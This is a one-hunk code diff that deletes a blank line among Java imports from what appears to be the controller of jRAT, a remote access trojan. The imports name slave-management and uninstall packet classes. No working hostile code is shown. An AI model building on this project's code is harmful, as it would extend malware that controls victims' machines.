@@ -5,7 +5,6 @@ import io.jrat.controller.AbstractSlave;
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet36Uninstall;
 import io.jrat.controller.utils.Utils;
-
 import javax.swing.ImageIcon;
 
 
